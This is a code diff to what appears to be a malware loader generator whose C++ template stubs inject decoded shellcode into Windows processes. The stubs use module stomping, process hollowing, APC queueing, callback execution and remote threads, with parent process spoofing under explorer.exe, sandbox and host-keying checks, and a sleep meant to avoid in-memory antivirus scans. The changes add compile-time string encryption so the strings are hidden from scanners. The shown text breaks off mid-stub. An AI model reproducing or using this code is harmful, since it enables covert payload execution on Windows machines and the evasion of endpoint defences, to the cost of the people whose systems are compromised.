@@ -22,7 +22,8 @@ stub = """
 #include <psapi.h>
 #include <tlhelp32.h>
 #include <stdlib.h>
-#include <tchar.h> // modulestomp
+#include <tchar.h>
+#include "skCrypter.h"
 REPLACE_ME_SYSCALL_INCLUDE
 #ifndef UNICODE  
 typedef std::string String;
@@ -34,6 +35,8 @@ REPLACE_ME_SHELLCODE_VARS
 
 #define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
 #define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000
+
+REPLACE_SAFEPRINT_FUNCTIONS
 
 REPLACE_GetSyscallStubP1
 
@@ -74,7 +77,7 @@ regularDecode = """
 int deC(unsigned char payload[])
 {
     std::string key;
-    key = "REPLACE_ME_KEY";
+    key = skCrypt("REPLACE_ME_KEY");
     for (int i = 0; i < payload_len; i++)
     {
         char d = payload[i];
@@ -84,6 +87,7 @@ int deC(unsigned char payload[])
         }
         decoded[i] = d;
     }
+    key.clear();
     return 0;
 }
 """
@@ -105,6 +109,25 @@ int deC()
         char ci = i2;
         decoded[i] = ci;
     }
+    return 0;
+}
+"""
+
+# This can be used to remove strings from memory. Currently breaks when used with ollvm
+safePrint = """
+int safe_print(auto msg)
+{
+    printf(msg);
+    printf("\\n");
+    msg.clear();
+    return 0;
+}
+
+int safe_print(auto msg, NTSTATUS res)
+{
+    printf(msg);
+    printf("0x%x\\n", res);
+    msg.clear();
     return 0;
 }
 """
@@ -371,7 +394,7 @@ BOOL CheckSandbox() {
     ULONG64 timeBeforeSleep = GetTickCount64();
     LARGE_INTEGER delay;
     delay.QuadPart = -10000 * 60000;
-    std::cout << "Please wait 60 seconds..." << std::endl;
+    safe_print(skCrypt("Please wait 60 seconds..."));
     NtDelayExecution(FALSE, &delay);
     ULONG64 timeAfterSleep = GetTickCount64();
     if (timeAfterSleep - timeBeforeSleep < 60000)
@@ -387,7 +410,7 @@ int hostcheck()
     char hostname[64];
     DWORD hostnamesize = 64;
     GetComputerNameA(hostname, &hostnamesize);
-    if (strcmp(hostname, "REPLACE_ME_HOSTNAME") != 0) {
+    if (strcmp(hostname, skCrypt("REPLACE_ME_HOSTNAME")) != 0) {
         exit (EXIT_FAILURE);
     }
     return 0;
@@ -400,7 +423,7 @@ int usercheck()
     char username[4000];
     DWORD usernameamesize = 4000;
     GetUserName(username, &usernameamesize);
-    if (strcmp(username, "REPLACE_ME_USERNAME") != 0) {
+    if (strcmp(username, skCrypt("REPLACE_ME_USERNAME")) != 0) {
         exit (EXIT_FAILURE);
     }
     return 0;
@@ -413,7 +436,7 @@ int domaincheck()
     char domain[164];
     DWORD domainsize = 164;
     GetComputerNameEx(ComputerNameDnsDomain, domain, &domainsize);
-    if (strcmp(domain, "REPLACE_ME_DOMAINNAME") != 0) {
+    if (strcmp(domain, skCrypt("REPLACE_ME_DOMAINNAME")) != 0) {
         exit (EXIT_FAILURE);
     }
     return 0;
@@ -567,8 +590,8 @@ module_stomping_stub = """
 
     HANDLE processHandle;
     PVOID remoteBuffer;
-    char moduleToInject[] = "xpsservices.dll";
-    char moduleFunction[] = "DllCanUnloadNow";
+    auto moduleToInject = skCrypt("mstscax.dll");
+    auto moduleFunction = skCrypt("DllCanUnloadNow");
     HMODULE modules[256] = {};
     SIZE_T modulesSize = sizeof(modules);
     DWORD modulesSizeNeeded = 0;
@@ -586,38 +609,24 @@ module_stomping_stub = """
         printf("Doing nothing!");
     }
 
-    HANDLE hParent = GetParentHandle("explorer.exe");
+    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
     if (hParent == INVALID_HANDLE_VALUE)
         return 0;
 
-    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
+    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
     if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
         return 0;
     
     processHandle = pi.hProcess;
 
-    LPVOID test = (LPVOID)GetProcAddress(LoadLibraryA(TEXT("Kernel32.dll")), "LoadLibraryExA");
+    LPVOID test = (LPVOID)GetProcAddress(LoadLibraryA(TEXT("Kernel32.dll")), skCrypt("LoadLibraryExA"));
     unsigned char adr[8];
     *(uintptr_t*)adr = (uintptr_t)test; 
-    std::cout << test << std::endl;
-    /*
-    for (int i = 0; i < 8; i++)
-    {
-        printf("%x\\n", adr[i]);
-    }
-    */
 
     unsigned char shim[] =  {0x48, 0xB8, adr[0], adr[1], adr[2], adr[3], adr[4], adr[5], adr[6],adr[7],
             0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
             0x48, 0x31, 0xD2,
             0xFF, 0xE0};
-
-    /*
-    for (int i = 0; i < sizeof shim; i++)
-    {
-        printf("0x%x,", shim[i]);
-    }
-    */
 
     LPVOID allocModule = NULL;
     LPVOID allocShim = NULL;
@@ -627,50 +636,46 @@ module_stomping_stub = """
     SIZE_T moduleSize = sizeof(moduleToInject) + 2;
     SIZE_T shimSize = sizeof shim;
 
-
     res = NtAllocateVirtualMemory(processHandle, &allocModule, 0, &moduleSize, MEM_COMMIT | MEM_RESERVE, 0x40);
-    std::cout << std::endl << "NtAllocateVirtualMemory res (allocModule): " << std::hex << res << std::endl;
+    safe_print(skCrypt("NtAllocateVirtualMemory res (allocModule): "), res);
     res = NtAllocateVirtualMemory(processHandle, &allocShim, 0, &shimSize, MEM_COMMIT | MEM_RESERVE, 0x40);
-    std::cout << "NtAllocateVirtualMemory res (allocShim): " << std::hex << res << std::endl;
-
-    //WriteProcessMemory(processHandle, allocShim, shim, sizeof shim, &bytesWritten); //USE THIS INSTEAD OF NTWRITEVIRTUALMEMORY TO PREVENT CRASHES
-    //WriteProcessMemory(processHandle, allocModule, moduleToInject, sizeof moduleToInject, &bytesWritten);
+    safe_print(skCrypt("NtAllocateVirtualMemory res (allocShim): "), res);
     
-    std::cout << "allocShim:   " << allocShim << std::endl;
-    std::cout << "allocModule: " << allocModule << std::endl;
+    auto eString = skCrypt("allocShim:   ");
+    printf("%s%#p\\n", eString.decrypt(), allocShim);
+    eString.clear();
+    eString = skCrypt("allocModule: ");
+    printf("%s%#p\\n", eString.decrypt(), allocModule);
+    eString.clear();
 
     res = NtWriteVirtualMemory(processHandle, allocModule, moduleToInject, sizeof moduleToInject, &bytesWritten);
-    std::cout << "NtWriteVirtualMemory res (moduleToInject): " << std::hex << res << std::endl;
+    safe_print(skCrypt("NtWriteVirtualMemory res (moduleToInject): "), res);
     res = NtWriteVirtualMemory(processHandle, allocShim, shim, shimSize, &bytesWritten);
-    std::cout << "NtWriteVirtualMemory res (Shim): " << std::hex << res << std::endl;
+    safe_print(skCrypt("NtWriteVirtualMemory res (Shim): "), res);
     if (res != 0)
     {
-        std::cout << "[!] NtWriteVirtualMemory FAILED! This happens occassionally due to an unkown bug.";
+        safe_print(skCrypt("[!] NtWriteVirtualMemory FAILED! This happens occassionally due to an unkown bug."));
         return 1;
     }
 
-    //hThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)allocShim, allocModule, 0, NULL);
-    //WaitForSingleObject(hThread, 0);
     res = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, allocShim, allocModule, FALSE, 0, 0, 0, NULL);
-    std::cout << "NtCreateThreadEx res (Shim): " << std::hex << res << std::endl;
+    safe_print(skCrypt("NtCreateThreadEx res (Shim): "), res);
     res = NtWaitForSingleObject(hThread, -1, NULL);
-    std::cout << "NtWaitForSingleObject res (Shim): " << std::hex << res << std::endl;
-    //NtClose(hThread);
-
-    //res = NtFreeVirtualMemory(processHandle, &allocModule, &moduleSize, MEM_RELEASE);
-    //std::cout << "res: " << std::hex << res << std::endl;
-    //res = NtFreeVirtualMemory(processHandle, &allocShim, &shimSize, MEM_RELEASE);
-    //std::cout << "res: " << std::hex << res << std::endl;
+    safe_print(skCrypt("NtWaitForSingleObject res (Shim): "), res);
 
     HMODULE xps = LoadLibraryExA(moduleToInject, NULL, DONT_RESOLVE_DLL_REFERENCES);
     LPVOID funcAddress = (LPVOID)GetProcAddress(xps, moduleFunction);
 
-    std::cout << "funcAddress: " << funcAddress << std::endl;
+    eString = skCrypt("funcAddress: ");
+    printf("%s%#p\\n", eString.decrypt(), funcAddress);
+    eString.clear();
 
     PVOID f2 = (PVOID)funcAddress;
     long funcOffset = (uintptr_t)f2 - (uintptr_t)xps;
 
-    std::cout << "funcOffset: " << funcOffset << std::endl;
+    auto eString2 = skCrypt("funcOffset: ");
+    printf("%s%#p\\n", eString2.decrypt(), funcOffset);
+    eString2.clear();
 
     HMODULE hMods[1024];
     DWORD cbNeeded;
@@ -690,9 +695,13 @@ module_stomping_stub = """
                 {
                     _tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                     moduleBaseAddr = hMods[i];
-                    std::cout << "Module found" << std::endl;
-                    std::cout << "szModName: " << szModName << std::endl;
-                    std::cout << "Baseaddr: " << std::hex << hMods[i] << std::endl;
+                    safe_print(skCrypt("Module found"));
+                    auto eString3 = skCrypt("szModName: ");
+                    printf("%s%s\\n", eString3.decrypt(), szModName);
+                    eString3.clear();
+                    auto eString4 = skCrypt("Baseaddr: ");
+                    printf("%s%#p\\n", eString4.decrypt(), hMods[i]);
+                    eString4.clear();
                 }
             }
         }
@@ -700,24 +709,26 @@ module_stomping_stub = """
 
     LPVOID remoteFuncAddress = (LPVOID)((uintptr_t)moduleBaseAddr + (uintptr_t)funcOffset);
 
-    std::cout << "remoteFuncAddress: " << remoteFuncAddress << std::endl;
+    auto eString5 = skCrypt("remoteFuncAddress: ");
+    printf("%s%#p\\n", eString5.decrypt(), remoteFuncAddress);
+    eString5.clear();
 
-    SIZE_T shellcodeLen = sizeof payload_len;
+    SIZE_T shellcodeLen = payload_len;
     SIZE_T bytesWritten2;
 
-    //res = NtAllocateVirtualMemory(processHandle, &funcAddress, 0, &shellcodeLen, MEM_COMMIT, 0x40);
-    //WriteProcessMemory(processHandle, funcAddress, shellcode, shellcodeLen, &bytesWritten);
+    uintptr_t jankOffset = (uintptr_t)remoteFuncAddress % (0x1000);
+    auto eString6 = skCrypt("jankOffset: ");
+    printf("%s%#p\\n", eString6.decrypt(), jankOffset);
+    eString6.clear();
+
     res = NtProtectVirtualMemory(processHandle, &remoteFuncAddress, &shellcodeLen, 0x40, &oldProtect);
-    std::cout << "NtProtectVirtualMemory res (shellcode): " << std::hex << res << std::endl;
-    res = NtWriteVirtualMemory(processHandle, (LPVOID)((uintptr_t)remoteFuncAddress + (uintptr_t)0x340), decoded, shellcodeLen, &bytesWritten2);
-    //WriteProcessMemory(processHandle, f2, shellcode, shellcodeLen, &bytesWritten);
-    //res = NtProtectVirtualMemory(processHandle, &funcAddress, &shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
-    std::cout << "NtWriteVirtualMemory res (shellcode): " << std::hex << res << std::endl;
+    safe_print(skCrypt("NtProtectVirtualMemory res (shellcode): "), res);
+    res = NtWriteVirtualMemory(processHandle, (LPVOID)((uintptr_t)remoteFuncAddress + jankOffset), decoded, shellcodeLen, &bytesWritten2);
+    safe_print(skCrypt("NtWriteVirtualMemory res (shellcode): "), res);
+
     HANDLE hThread2;
     res = NtCreateThreadEx(&hThread2, GENERIC_EXECUTE, NULL, processHandle, funcAddress, NULL, FALSE, 0, 0, 0, NULL);
-    std::cout << "NtCreateThreadEx res (shellcode): " << std::hex << res << std::endl;
-
-    std::cout << "DONE" << std::endl;
+    safe_print(skCrypt("NtCreateThreadEx res (shellcode): "), res);
 
     NtClose(hThread);
     NtClose(hThread2);
@@ -737,11 +748,11 @@ process_hollow_stub = """
         printf("Doing nothing!");
     }
 
-    HANDLE hParent = GetParentHandle("explorer.exe");
+    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
     if (hParent == INVALID_HANDLE_VALUE)
         return 0;
 
-    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
+    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
     if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
         return 0;
     
@@ -753,19 +764,23 @@ process_hollow_stub = """
     res = NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)0, &bi, sizeof(bi), &tmp);
 
     if (res != 0){
-        std::cout << "NtQueryInformationProcess FAILED to query created process, exiting: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtQueryInformationProcess FAILED to query created process, exiting: "), res);
         return 0;
     }
     else {
-        std::cout << "NtQueryInformationProcess queried the created process sucessfully." << std::endl;
+        safe_print(skCrypt("NtQueryInformationProcess queried the created process sucessfully."));
     }
 
     __int64 TEST = (__int64)bi.PebBaseAddress;
     __int64 TEST2 = TEST + 0x10;
     PVOID ptrImageBaseAddress = (PVOID)TEST2;
 
-    std::cout << "bi.PebBaseAddress: " << bi.PebBaseAddress << std::endl;
-    std::cout << "ptrImageBaseAddress: " << ptrImageBaseAddress << std::endl;
+    auto eString = skCrypt("bi.PebBaseAddress: ");
+    printf("%s%#p\\n", eString.decrypt(), bi.PebBaseAddress);
+    eString.clear();
+    auto eString2 = skCrypt("ptrImageBaseAddress: ");
+    printf("%s%#p\\n", eString2.decrypt(), ptrImageBaseAddress);
+    eString2.clear();
 
     PVOID baseAddressBytes;
     unsigned char data[513];
@@ -774,79 +789,85 @@ process_hollow_stub = """
     res = NtReadVirtualMemory(hProcess, ptrImageBaseAddress, &baseAddressBytes, sizeof(PVOID), &nBytes);
 
     if (res != 0){
-        std::cout << "NtReadVirtualMemory FAILED to read image base address, exiting: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtReadVirtualMemory FAILED to read image base address, exiting: "), res);
         return 0;
     }
     else{
-        std::cout << "NtReadVirtualMemory read image base address successfully." << std::endl;
+        safe_print(skCrypt("NtReadVirtualMemory read image base address successfully."));
     }
 
-    std::cout << "baseAddressBytes: " << baseAddressBytes << std::endl;
+    auto eString3 = skCrypt("baseAddressBytes: ");
+    printf("%s%#p\\n", eString3.decrypt(), baseAddressBytes);
+    eString3.clear();
 
     PVOID imageBaseAddress = (PVOID)(__int64)(baseAddressBytes);
 
     res = NtReadVirtualMemory(hProcess, imageBaseAddress, &data, sizeof(data), &nBytes);
 
     if (res != 0){
-        std::cout << "NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: " << std::hex << res << std::endl;
-        std::cout << "nBytes: " << nBytes << std::endl;
+        safe_print(skCrypt("NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: "), res);
+        auto eString4 = skCrypt("nBytes: ");
+        printf("%s%#p\\n", eString4.decrypt(), nBytes);
+        eString4.clear();
         return 0;
     }
     else{
-        std::cout << "NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully." << std::endl;
+        safe_print(skCrypt("NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully."));
     }
     
     uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(data + 0x3c);
-    std::cout << "e_lfanew: " << e_lfanew << std::endl;
+    //std::cout << "e_lfanew: " << e_lfanew << std::endl;
     uint32_t entrypointRvaOffset = e_lfanew + 0x28;
-    std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
+    //std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
     uint32_t entrypointRva = *reinterpret_cast<uint32_t*>(data + entrypointRvaOffset);
-    std::cout << "entrypointRva: " << entrypointRva << std::endl;
+    //std::cout << "entrypointRva: " << entrypointRva << std::endl;
     __int64 rvaconv = (__int64)imageBaseAddress;
     __int64 rvaconv2 = rvaconv + entrypointRva;
-    std::cout << "entrypointAddress: " << (PVOID)rvaconv2 << std::endl;
     PVOID entrypointAddress = (PVOID)rvaconv2;
+    auto eString5 = skCrypt("entrypointAddress: ");
+    printf("%s%#p\\n", eString5.decrypt(), entrypointAddress);
+    eString5.clear();
 
     ULONG oldprotect;
     SIZE_T bytesWritten;
-    SIZE_T shellcodeLength = (SIZE_T)payload_len;
+    SIZE_T shellcodeLength = payload_len;
 
     res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, 0x40, &oldprotect);
 
     if (res != 0){
-        std::cout << "NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: "), res);
         return 0;
     }
     else{
-        std::cout << "NtProtectVirtualMemory set permissions on entrypointAddress successfully." << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory set permissions on entrypointAddress successfully."));
     }
 
     res = NtWriteVirtualMemory(hProcess, entrypointAddress, decoded, payload_len, &bytesWritten);
 
     if (res != 0){
-        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: "), res);
         return 0;
     }
     else{
-        std::cout << "NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully." << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully."));
     }
 
     res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, oldprotect, &tmp);
     if (res != 0){
-        std::cout << "NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: "), res);
         return 0;
     }
     else{
-        std::cout << "NtProtectVirtualMemory revert permissions on entrypointAddress successfully." << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory revert permissions on entrypointAddress successfully."));
     }
 
     res = NtResumeThread(hThread, &tmp);
     if (res != 0){
-        std::cout << "NtResumeThread FAILED to to resume thread: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtResumeThread FAILED to to resume thread: "), res);
         return 0;
     }
     else{
-        std::cout << "NtResumeThread resumed thread successfully." << std::endl;
+        safe_print(skCrypt("NtResumeThread resumed thread successfully."));
     }
 
     NtClose(hProcess);
@@ -869,61 +890,61 @@ CurrentThread_stub = """
     NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (res != 0){
-        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: "), res);
         return 0;
     }
     else {
-        std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
+        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the current process sucessfully."));
     }
 
     res = NtWriteVirtualMemory(hProc, base_addr, decoded, payload_len, &bytesWritten);
 
     if (res != 0){
-        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
         return 0;
     }
     else{
-        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
     }
 
     res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);
 
     if (res != 0){
-        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
         return 0;
     }
     else{
-        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
     }
 
     res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);
 
     if (res != 0){
-        std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtCreateThreadEx FAILED to create thread in current process: "), res);
         return 0;
     }
     else{
-        std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
+        safe_print(skCrypt("NtCreateThreadEx created thread in current process successfully."));
     }
 
     res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
     if (res != 0){
-        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
         return 0;
     }
     else{
-        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
     }
 
     res = NtResumeThread(thandle, 0);
 
     if (res != 0){
-        std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtResumeThread FAILED to resume created thread: "), res);
         return 0;
     }
     else{
-        std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
+        safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
     }
 
     res = NtWaitForSingleObject(thandle, -1, NULL);   
@@ -945,30 +966,30 @@ EnumDisplayMonitors_stub = """
     res = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT, PAGE_READWRITE);
 
     if (res != 0){
-        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: "), res);
         return 0;
     }
     else {
-        std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
+        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the current process sucessfully."));
     }
 
     res = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);
 
     if (res != 0){
-        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
         return 0;
     }
     else{
-        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
     }
 
     res = NtProtectVirtualMemory(hProc, &base_addr, &pnew, PAGE_EXECUTE_READ, &oldprotect);
     if (res != 0){
-        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
         return 0;
     }
     else{
-        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
     }
 
     EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)base_addr, NULL);
@@ -991,11 +1012,11 @@ QueueUserAPC_stub = """
         printf("Doing nothing!");
     }
 
-    HANDLE hParent = GetParentHandle("explorer.exe");
+    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
     if (hParent == INVALID_HANDLE_VALUE)
         return 0;
 
-    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
+    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
     if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
         return 0;
     
@@ -1005,51 +1026,51 @@ QueueUserAPC_stub = """
     res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (res != 0){
-        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: "), res);
         return 0;
     }
     else {
-        std::cout << "NtAllocateVirtualMemory allocated memory in the created process sucessfully." << std::endl;
+        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the created process sucessfully."));
     }
 
     res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);
 
     if (res != 0){
-        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
         return 0;
     }
     else{
-        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
     }
 
     res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
     if (res != 0){
-        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
         return 0;
     }
     else{
-        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
     }
 
     res = NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)base_addr, NULL, NULL, NULL);
 
     if (res != 0){
-        std::cout << "NtQueueApcThread FAILED to add routine to APC queue: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtQueueApcThread FAILED to add routine to APC queue: "), res);
         return 0;
     }
     else{
-        std::cout << "NtQueueApcThread added routine to APC queue successfully." << std::endl;
+        safe_print(skCrypt("NtQueueApcThread added routine to APC queue successfully."));
     }
 
     res = NtAlertResumeThread(hThread, NULL);
 
     if (res != 0){
-        std::cout << "NtAlertResumeThread FAILED to resume thread: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtAlertResumeThread FAILED to resume thread: "), res);
         return 0;
     }
     else{
-        std::cout << "NtAlertResumeThread resumed thread successfully." << std::endl;
+        safe_print(skCrypt("NtAlertResumeThread resumed thread successfully."));
     }
 
     NtClose(hProcess);
@@ -1078,7 +1099,7 @@ RemoteThreadSuspended_stub = """
     {
         while (Process32Next(snapshot, &entry) == TRUE)
         {
-            if (stricmp(entry.szExeFile, "REPLACE_ME_PROCESS") == 0)
+            if (stricmp(entry.szExeFile, skCrypt("REPLACE_ME_PROCESS")) == 0)
             {
                 OBJECT_ATTRIBUTES oa;
                 CLIENT_ID cid;
@@ -1088,74 +1109,74 @@ RemoteThreadSuspended_stub = """
 
                 NTSTATUS res = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
                 if (res != 0){
-                    std::cout << "NtOpenProcess FAILED to open the target process, exiting: " << std::hex << res << std::endl;
+                    safe_print(skCrypt("NtOpenProcess FAILED to open the target process, exiting: "), res);
                     return 0;
                 }
                 else {
-                    std::cout << "NtOpenProcess opened the target process sucessfully." << std::endl;
+                    safe_print(skCrypt("NtOpenProcess opened the target process sucessfully."));
                 }
 
                 res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
                 if (res != 0){
-                    std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: " << std::hex << res << std::endl;
+                    safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in the current process, exiting: "), res);
                     return 0;
                 }
                 else {
-                    std::cout << "NtAllocateVirtualMemory allocated memory in the current process sucessfully." << std::endl;
+                    safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the current process sucessfully."));
                 }
 
                 res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);
 
                 if (res != 0){
-                    std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
+                    safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
                     return 0;
                 }
                 else{
-                    std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
+                    safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
                 }
 
                 res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);
 
                 if (res != 0){
-                    std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
+                    safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
                     return 0;
                 }
                 else{
-                    std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
+                    safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
                 }
 
                 res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProcess, base_addr, NULL, TRUE, 0, 0, 0, NULL);
 
                 if (res != 0){
-                    std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
+                    safe_print(skCrypt("NtCreateThreadEx FAILED to create thread in current process: "), res);
                     return 0;
                 }
                 else{
-                    std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
+                    safe_print(skCrypt("NtCreateThreadEx created thread in current process successfully."));
                 }
 
-                std::cout << "Sleeping for 10 seconds to avoid in-memory AV scan..." << std::endl;
+                safe_print(skCrypt("Sleeping for 10 seconds to avoid in-memory AV scan..."));
                 Sleep(10000);
 
                 res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
                 if (res != 0){
-                    std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
